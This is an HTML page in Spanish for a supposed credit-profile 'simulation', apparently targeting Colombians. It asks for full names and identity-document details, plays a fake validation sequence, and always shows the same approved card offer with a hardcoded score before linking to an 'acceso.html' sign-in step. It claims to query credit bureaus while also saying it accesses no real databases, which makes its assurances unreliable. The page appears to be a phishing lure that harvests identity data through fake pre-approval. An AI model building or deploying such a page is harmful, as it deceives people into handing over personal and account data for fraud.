<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Simulador Online - Solicitud en Linea</title>
  <link rel="stylesheet" href="styles.css" />
  <link rel="preconnect" href="https://fonts.googleapis.com" />
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet" />
  <script src="protect.js"></script>
</head>
<body>
  <!-- Header -->
  <header class="site-header">
    <div class="container header-inner">
      <a href="#" class="logo" aria-label="Inicio">
        <img src="img/logo.svg" alt="Logo" class="logo-img" />
      </a>
      <nav class="nav-desktop" aria-label="Principal">
        <a href="#">Inicio</a>
        <a href="#" class="active">Validación</a>
        <a href="#">Tarjetas</a>
        <a href="#">Contacto</a>
      </nav>
      <a href="#" class="btn-login">Iniciar Sesión</a>
      <button class="menu-btn" aria-label="Abrir menú">
        <span></span><span></span><span></span>
      </button>
    </div>
  </header>

  <!-- Hero -->
  <section class="hero">
    <div class="hero-bg">
      <span class="circle circle-1"></span>
      <span class="circle circle-2"></span>
    </div>
    <div class="container hero-content">
      <div class="shield-icon" aria-hidden="true">
        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
          <path d="M12 2l8 4v6c0 5-3.5 9.5-8 10-4.5-.5-8-5-8-10V6l8-4z"/>
          <path d="M9 12l2 2 4-4"/>
        </svg>
      </div>
      <h1 class="hero-title">Evaluación de Perfil Financiero</h1>
      <p class="hero-sub">Ingresa tus datos para simular tu perfil financiero.</p>
    </div>
  </section>

  <!-- Stepper -->
  <section class="stepper-wrap">
    <div class="container">
      <ol class="stepper" id="stepper">
        <li class="step active" data-step="1">
          <div class="step-circle">
            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/><circle cx="12" cy="7" r="4"/></svg>
          </div>
          <span class="step-label">Datos<br/>Personales</span>
        </li>
        <li class="step" data-step="2">
          <div class="step-circle">
            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="4" y="4" width="16" height="18" rx="2"/><path d="M9 2h6v4H9z"/><path d="M8 12h8M8 16h6"/></svg>
          </div>
          <span class="step-label">Identificación</span>
        </li>
        <li class="step" data-step="3">
          <div class="step-circle">
            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="11" cy="11" r="7"/><path d="M21 21l-4.3-4.3"/></svg>
          </div>
          <span class="step-label">Validación</span>
        </li>
        <li class="step" data-step="4">
          <div class="step-circle">
            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="9"/><path d="M8 12l3 3 5-6"/></svg>
          </div>
          <span class="step-label">Resultados</span>
        </li>
      </ol>
    </div>
  </section>

  <!-- Form sections -->
  <main class="container main">
    <!-- STEP 1: Datos Personales -->
    <section class="form-section active" data-form="1">
      <div class="alert alert-warning">
        <strong>Importante:</strong> Simulación informativa. No accede a bases de datos crediticias reales.
      </div>

      <h2 class="form-title">Información Personal</h2>
      <p class="form-sub">Ingresa tus datos para simular tu perfil financiero.</p>

      <form id="form1" class="form-grid" novalidate>
        <div class="field">
          <label for="nombres">Nombres Completos <span class="req">*</span></label>
          <input type="text" id="nombres" name="nombres" placeholder="Juan Carlos" required />
        </div>
        <div class="field">
          <label for="apellidos">Apellidos Completos <span class="req">*</span></label>
          <input type="text" id="apellidos" name="apellidos" placeholder="Pérez González" required />
        </div>
        <div class="actions full">
          <button type="submit" class="btn-primary">
            Continuar
            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M5 12h14M13 5l7 7-7 7"/></svg>
          </button>
        </div>
      </form>
    </section>

    <!-- STEP 2: Identificación -->
    <section class="form-section" data-form="2">
      <h2 class="form-title">Información de Identificación</h2>
      <p class="form-sub">Tus datos de identificación son necesarios para consultar las centrales de riesgo.</p>

      <form id="form2" class="form-grid" novalidate>
        <div class="field">
          <label for="tipoDoc">Tipo de Documento <span class="req">*</span></label>
          <div class="select-wrap">
            <select id="tipoDoc" name="tipoDoc" required>
              <option value="" disabled selected>Seleccionar</option>
              <option value="CC">Cédula de Ciudadanía</option>
              <option value="CE">Cédula de Extranjería</option>
              <option value="TI">Tarjeta de Identidad</option>
              <option value="PA">Pasaporte</option>
            </select>
            <svg class="select-caret" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M6 9l6 6 6-6"/></svg>
          </div>
        </div>

        <div class="field">
          <label for="numDoc">Número de Documento <span class="req">*</span></label>
          <input type="text" id="numDoc" name="numDoc" inputmode="numeric" placeholder="123456789" required />
        </div>

        <div class="field">
          <label for="fechaExp">Fecha de Expedición <span class="req">*</span></label>
          <input
            type="text"
            id="fechaExp"
            name="fechaExp"
            inputmode="numeric"
            placeholder="DD/MM/AAAA"
            maxlength="10"
            autocomplete="off"
            required
          />
        </div>

        <div class="field">
          <label for="lugarExp">Lugar de Expedición <span class="req">*</span></label>
          <input type="text" id="lugarExp" name="lugarExp" placeholder="Bogotá D.C." required />
        </div>

        <div class="alert alert-info full">
          <div class="alert-icon">
            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 2l8 4v6c0 5-3.5 9.5-8 10-4.5-.5-8-5-8-10V6l8-4z"/></svg>
          </div>
          <div>
            <strong>Protección de Datos</strong>
            <p>Tus datos personales están protegidos bajo la Ley 1581 de 2012 de Protección de Datos Personales. Solo serán utilizados para fines de evaluación crediticia.</p>
          </div>
        </div>

        <div class="actions full">
          <button type="submit" class="btn-primary">
            Continuar
            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M5 12h14M13 5l7 7-7 7"/></svg>
          </button>
        </div>
      </form>
    </section>

    <!-- STEP 3: Validación (loading) -->
    <section class="form-section" data-form="3">
      <h2 class="form-title">Simulación de Perfil Crediticio</h2>
      <p class="form-sub">Ingresa tus datos para generar una evaluación estimada de tu perfil financiero.</p>

      <div class="validation-block">
        <div class="spinner small" aria-hidden="true"></div>
        <h3 class="validation-title">Analizando tu Perfil Estimado</h3>
        <p class="validation-sub">Este proceso puede tomar hasta 60 segundos...</p>

        <ul class="status-list">
          <li class="status-done">
            <span class="status-icon">
              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><path d="M5 12l5 5L20 7"/></svg>
            </span>
            Verificando información
          </li>
          <li class="status-done">
            <span class="status-icon">
              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><path d="M5 12l5 5L20 7"/></svg>
            </span>
            Consultando perfil financiero
          </li>
          <li class="status-done">
            <span class="status-icon">
              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><path d="M5 12l5 5L20 7"/></svg>
            </span>
            Consultando historial crediticio
          </li>
          <li class="status-loading">
            <span class="status-icon">
              <span class="status-dot"></span>
            </span>
            Analizando elegibilidad de productos...
          </li>
        </ul>
      </div>
    </section>

    <!-- STEP 4: Resultados -->
    <section class="form-section" data-form="4">
      <h2 class="form-title">Resultados de Simulación</h2>
      <p class="form-sub">Basado en tu perfil estimado, tenemos estas opciones para ti.</p>

      <div class="alert alert-success">
        <div class="alert-icon success">
          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><path d="M8 12l3 3 5-6"/></svg>
        </div>
        <div>
          <strong>¡Felicidades!</strong>
          <p>Tu perfil estimado cumple con nuestros criterios. Tienes acceso a múltiples opciones financieras.</p>
        </div>
      </div>

      <!-- Tarjeta producto -->
      <div class="product-card">
        <div class="product-card-img">
          <img src="img/tarjeta.webp" alt="Tarjeta CeroRollo" class="product-img" />
        </div>
        <div class="product-card-body">
          <div class="product-head">
            <h3 class="product-title">Tarjeta CeroRollo</h3>
            <span class="badge badge-success">APROBADA</span>
          </div>
          <ul class="product-info">
            <li><span>Monto aprobado:</span><strong class="text-success">$5.979.900</strong></li>
            <li><span>Tasa de interés:</span><strong>1.1% mensual</strong></li>
            <li><span>Cuota manejo:</span><strong>$11.000</strong></li>
          </ul>
          <a href="acceso.html" class="btn-purple">Solicitar Ahora</a>
          <p class="product-note">Oferta exclusiva para clientes antiguos. Sujeto a verificación.</p>
        </div>
      </div>

      <!-- Resumen de perfil -->
      <div class="summary-card">
        <h3 class="summary-title">Resumen de tu Perfil</h3>
        <div class="summary-grid">
          <div class="summary-item">
            <div class="summary-value">750</div>
            <div class="summary-label">Score Crediticio</div>
          </div>
          <div class="summary-item">
            <div class="summary-value text-success">Excelente</div>
            <div class="summary-label">Historial</div>
          </div>
          <div class="summary-item">
            <div class="summary-value">0</div>
            <div class="summary-label">Reportes Negativos</div>
          </div>
          <div class="summary-item">
            <div class="summary-value">2</div>
            <div class="summary-label">Productos Aptos</div>
          </div>
        </div>
      </div>

      <!-- Validación segura -->
      <div class="alert alert-info">
        <div class="alert-icon">
          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 2l8 4v6c0 5-3.5 9.5-8 10-4.5-.5-8-5-8-10V6l8-4z"/></svg>
        </div>
        <div>
          <strong>Validación Segura y Confidencial</strong>
          <p>Utilizamos encriptación de 256 bits para proteger tus datos. Tu información es procesada a través de conexiones seguras y solo se comparte con entidades financieras autorizadas para fines de evaluación crediticia, cumpliendo con todas las normativas de protección de datos personales en Colombia.</p>
        </div>
      </div>

      <div class="actions space-between">
        <button type="button" class="btn-ghost" data-action="restart">
          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M3 12a9 9 0 1 0 3-6.7L3 8"/><path d="M3 3v5h5"/></svg>
          Nueva simulación
        </button>
      </div>
    </section>
  </main>

  <!-- Footer -->
  <footer class="site-footer">
    <div class="container footer-inner">
      <div class="footer-left">
        <div class="footer-logo">
          <img src="img/logo.svg" alt="Logo" class="logo-img footer-logo-img" />
        </div>
        <p class="footer-copy">© 2024 Validación Crediticia. Todos los derechos reservados.</p>
      </div>
      <nav class="footer-links" aria-label="Enlaces del pie">
        <a href="#">Privacidad</a>
        <a href="#">Términos</a>
        <a href="#">Seguridad</a>
        <a href="#">Ayuda</a>
      </nav>
    </div>
  </footer>

  <script src="script.js"></script>
</body>
</html>
